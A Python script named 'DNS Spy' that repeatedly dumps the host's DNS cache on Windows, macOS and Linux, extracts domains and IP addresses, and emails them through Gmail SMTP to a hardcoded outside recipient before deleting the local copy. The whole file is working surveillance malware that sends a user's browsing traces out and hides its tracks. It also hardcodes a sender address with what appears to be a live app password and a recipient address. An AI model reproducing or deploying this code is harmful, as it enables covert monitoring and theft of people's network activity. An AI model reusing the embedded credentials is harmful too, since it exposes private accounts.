import os
import re
import time
import platform
from subprocess import Popen, PIPE
from typing import Set
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

config = {
    "save_filename": "domains.txt",
    "interval_dns": 10,
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "sender_email": "jer.smith0004@gmail.com",
    "sender_password": "sytiyodhteowqfef",
    "recipient_email": "sof.ohanyan@gmail.com"
}

def send_email(file_path: str, config: dict):
    try:
        subject = "DNS Data Extracted"
        body = "Attached is the DNS data extracted from your system."

        msg = MIMEMultipart()
        msg['From'] = config["sender_email"]
        msg['To'] = config["recipient_email"]
        msg['Subject'] = subject

        msg.attach(MIMEText(body, 'plain'))

        with open(file_path, "rb") as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(file_path)}")
            msg.attach(part)

        with smtplib.SMTP(config["smtp_server"], config["smtp_port"]) as server:
            server.starttls()  # Secure the connection
            server.login(config["sender_email"], config["sender_password"])  # Login to the email server
            server.sendmail(config["sender_email"], config["recipient_email"], msg.as_string())  # Send email
            print(f"Email sent successfully to {config['recipient_email']}")

    except Exception as e:
        print(f"Failed to send email: {e}")

def extract_dns_data() -> Set[str]:
    dns_data = set()
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"Extracting DNS data at {timestamp}...")

        if platform.system() == "Windows":
            command = ["ipconfig", "/displaydns"]
            process = Popen(command, stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()

            if stderr:
                print(f"Error executing command: {stderr.decode()}")
                return dns_data

            domain_pattern = re.compile(r"([a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.)+[a-zA-Z]{2,5}")
            ip_pattern = re.compile(r"([0-9]{1,3}\.){3}[0-9]{1,3}")

            domains = set(match[0] for match in domain_pattern.findall(stdout.decode()))
            ips = set(match[0] for match in ip_pattern.findall(stdout.decode()))
            dns_data = domains.union(ips)

        elif platform.system() == "Darwin":  # macOS
            process = Popen(["sudo", "killall", "-INFO", "mDNSResponder"], stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()

            if stderr:
                print(f"Error executing command: {stderr.decode()}")
                return dns_data

            with open("/var/log/system.log", "r") as log_file:
                log_data = log_file.read()
                domain_pattern = re.compile(r"([a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.)+[a-zA-Z]{2,5}")
                ip_pattern = re.compile(r"([0-9]{1,3}\.){3}[0-9]{1,3}")

                domains = set(match[0] for match in domain_pattern.findall(log_data))
                ips = set(match[0] for match in ip_pattern.findall(log_data))
                dns_data = domains.union(ips)

        else:
            if os.path.exists("/usr/bin/resolvectl"):
                command = ["resolvectl", "query", "--dns-cache"]
            elif os.path.exists("/usr/sbin/nscd"):
                command = ["nscd", "-g"]
            elif os.path.exists("/usr/sbin/dnsmasq"):
                command = ["sudo", "killall", "-USR1", "dnsmasq"]
            else:
                print("No known DNS cache manager found on this system.")
                return dns_data

            process = Popen(command, stdout=PIPE, stderr=PIPE)
            stdout, stderr = process.communicate()

            if stderr:
                print(f"Error executing command: {stderr.decode()}")
                return dns_data

            domain_pattern = re.compile(r"([a-zA-Z0-9]([-_]?[a-zA-Z0-9]){0,62}\.)+[a-zA-Z]{2,5}")
            ip_pattern = re.compile(r"([0-9]{1,3}\.){3}[0-9]{1,3}")

            domains = set(match[0] for match in domain_pattern.findall(stdout.decode()))
            ips = set(match[0] for match in ip_pattern.findall(stdout.decode()))
            dns_data = domains.union(ips)

        return dns_data

    except Exception as e:
        print(f"Failed to extract DNS data: {e}")
        return set()

def save_to_file(data: Set[str], save_filename: str, config: dict):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        filename = f"{save_filename}_{timestamp}.txt"

        with open(filename, "w") as file:
            file.write(f"=== DNS Data Extracted at {timestamp} ===\n")
            for item in data:
                file.write(item + "\n")

        print(f"Saved {len(data)} entries to {filename}")

        # Send the file via email
        send_email(filename, config)
        if os.path.exists(filename):
            os.remove(filename)
            print(f"Deleted file: {filename}")
    except Exception as e:
        print(f"Failed to save data to file: {e}")

def main():
    try:
        save_filename = config["save_filename"]
        interval_dns = config["interval_dns"]

        print("Starting DNS Spy...")

        while True:
            print("Extracting DNS data...")
            dns_data = extract_dns_data()

            if dns_data:
                save_to_file(dns_data, save_filename, config)

            print(f"Waiting {interval_dns} seconds before the next extraction...")
            time.sleep(interval_dns)

    except KeyboardInterrupt:
        print("Process interrupted by user.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()

